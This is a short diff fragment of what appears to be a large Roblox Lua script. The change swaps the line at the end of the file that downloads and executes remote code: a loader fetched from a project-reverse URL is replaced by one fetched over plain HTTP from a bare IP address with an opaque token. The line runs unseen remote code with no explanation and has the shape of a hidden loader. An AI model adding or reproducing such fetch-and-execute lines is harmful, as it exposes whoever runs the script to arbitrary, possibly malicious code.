@@ -10383,4 +10383,4 @@ print("Kittylol  success")
 
 
 end)
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjAwNGFkODZkLTFmNGMtNDZiZS1iZWQ1LWYxOTUyZjAxZTFjYSIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("http://31.172.87.116/uEHRsHJU4VbRu6q6KuSgL6RiQ0jBNbhlklHZSVKtWI4jKYn1lGp7MqZgmfMDT2JxnJJgYv5xvg0wJuXg"))()
